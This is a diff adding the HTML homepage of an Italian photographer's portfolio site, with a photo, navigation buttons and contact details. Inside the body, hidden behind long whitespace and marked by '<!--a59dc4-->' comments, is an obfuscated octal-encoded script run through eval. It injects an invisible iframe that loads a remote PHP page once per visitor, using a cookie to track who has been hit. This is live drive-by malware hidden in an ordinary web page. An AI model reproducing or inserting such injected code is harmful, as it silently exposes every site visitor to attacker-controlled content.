@@ -1,0 +1,170 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="ISO-8859-1">
+<title>Untitled Page</title>
+<meta name="generator" content="WYSIWYG Web Builder 8 - http://www.wysiwygwebbuilder.com">
+<style type="text/css">
+div#container
+{
+   width: 994px;
+   position: relative;
+   margin-top: 0px;
+   margin-left: auto;
+   margin-right: auto;
+   text-align: left;
+}
+body
+{
+   font-size: 8px;
+   line-height: 1.1875;
+   text-align: center;
+   margin: 0;
+   background-color: #FFFFFF;
+   color: #000000;
+}
+</style>
+<style type="text/css">
+a
+{
+   color: #C8D7EB;
+   text-decoration: underline;
+}
+a:visited
+{
+   color: #C8D7EB;
+}
+a:active
+{
+   color: #C8D7EB;
+}
+a:hover
+{
+   color: #376BAD;
+   text-decoration: underline;
+}
+</style>
+<style type="text/css">
+#Image1
+{
+   border: 0px #000000 solid;
+}
+#wb_Text2 
+{
+   background-color: transparent;
+   border: 0px #000000 solid;
+   padding: 0;
+}
+#wb_Text2 div
+{
+   text-align: center;
+}
+#wb_Text3 
+{
+   background-color: transparent;
+   border: 0px #000000 solid;
+   padding: 0;
+}
+#wb_Text3 div
+{
+   text-align: center;
+}
+#NavigationBar1 ul.navbar
+{
+   list-style: none;
+   margin: 0;
+   padding: 0;
+}
+#NavigationBar1 ul.navbar li
+{
+   height: 28px;
+   width: 100px;
+   margin: 0px 0px 4px 0px;
+   vertical-align: bottom;
+}
+#NavigationBar1 ul.navbar li a
+{
+   display: block;
+   position: relative;
+}
+#NavigationBar1 ul.navbar li a img
+{
+   position: absolute;
+   z-index: 1;
+   border-width: 0px;
+}
+#NavigationBar1 ul.navbar li span
+{
+   display: block;
+   height: 28px;
+   width: 100px;
+   position: absolute;
+   z-index: 2;
+}
+#NavigationBar1 a .hover
+{
+   visibility: hidden;
+}
+#NavigationBar1 a:hover .hover
+{
+   visibility: visible;
+}
+#NavigationBar1 a:hover span
+{
+   visibility: hidden;
+}
+#Image2
+{
+   border: 0px #000000 solid;
+}
+#wb_Text4 
+{
+   background-color: transparent;
+   border: 0px #000000 solid;
+   padding: 0;
+}
+#wb_Text4 div
+{
+   text-align: left;
+}
+#Marquee1
+{
+   background-color: #FFFFFF;
+   border: 1px #FFFFFF solid;
+}
+#Image3
+{
+   border: 0px #000000 solid;
+}
+</style>
+</head>
+<body>
+<div id="container">
+<div id="wb_Image1" style="position:absolute;left:30px;top:90px;width:810px;height:508px;z-index:0;">
+<img src="images/DSC_6475.jpg" id="Image1" alt="" style="width:810px;height:508px;"></div><!--a59dc4--><script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                          a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,170,162,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,170,162,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,154,66,153,151,155,167,170,62,162,151,170,63,150,175,106,152,134,72,122,112,62,164,154,164,53,77,21,16,44,170,162,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,170,162,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,170,162,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,170,162,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,170,162,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,170,162,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,170,162,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,170,162,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,170,162,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,170,162,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));ss=eval("Str"+"ing");d=document;for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body++}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script><!--/a59dc4-->
+
+
+
+<div id="wb_Text2" style="position:absolute;left:30px;top:607px;width:810px;height:18px;text-align:center;z-index:1;">
+<span style="color:#000000;font-family:Arial;font-size:16px;">copyright &#169; lucamata - tutti i diritti riservati</span></div>
+<div id="wb_Text3" style="position:absolute;left:60px;top:120px;width:360px;height:49px;text-align:center;z-index:2;">
+<span style="color:#FFFFFF;font-family:Arial;font-size:43px;">Luca Mata</span><span style="color:#000000;font-family:Arial;font-size:43px;"> </span><span style="color:#FF0000;font-family:Arial;font-size:27px;"><strong><em>fotografo</em></strong></span></div>
+<div id="NavigationBar1" style="position:absolute;left:840px;top:90px;width:100px;height:160px;z-index:3;">
+<ul class="navbar">
+<li><a href=""><img src="images/img0001_over.gif" alt="" class="hover"><span><img src="images/img0001.gif" alt=""></span></a></li>
+<li><a href=""><img src="images/img0002_over.gif" alt="" class="hover"><span><img src="images/img0002.gif" alt=""></span></a></li>
+<li><a href=""><img src="images/img0003_over.gif" alt="" class="hover"><span><img src="images/img0003.gif" alt=""></span></a></li>
+<li><a href=""><img src="images/img0004_over.gif" alt="" class="hover"><span><img src="images/img0004.gif" alt=""></span></a></li>
+<li><a href="./Contatti.html"><img src="images/img0005_over.gif" alt="" class="hover"><span><img src="images/img0005.gif" alt=""></span></a></li>
+</ul>
+</div>
+<div id="wb_Image2" style="position:absolute;left:656px;top:8px;width:122px;height:73px;z-index:4;">
+<img src="images/work_in_progress.jpg" id="Image2" alt="" style="width:122px;height:73px;"></div>
+<div id="wb_Text4" style="position:absolute;left:46px;top:623px;width:489px;height:140px;z-index:5;">
+<span style="color:#000000;font-family:Arial;font-size:27px;">C</span><span style="color:#000000;font-family:Arial;font-size:20px;">ontatti<br><br>mobile: +39.328.2864939<br>email: <a href="luca_mata@hotmail.com">luca_mata@hotmail.com</a><br>blog: <a href="http://lucamata.tumblr.com/">www.lucamata.tumblr.com</a><br></span></div>
+<marquee direction="left" scrolldelay="0" scrollamount="10" behavior="scroll" loop="0" style="position:absolute;left:231px;top:21px;width:414px;height:40px;z-index:6;" id="Marquee1"><span style="color:#000000;font-family:Arial;font-size:27px;">....... in aggiornamento .......</span></marquee>
+<div id="wb_Image3" style="position:absolute;left:87px;top:9px;width:122px;height:73px;z-index:7;">
+<img src="images/work_in_progress.jpg" id="Image3" alt="" style="width:122px;height:73px;"></div>
+</div>
+</body>
+</html>
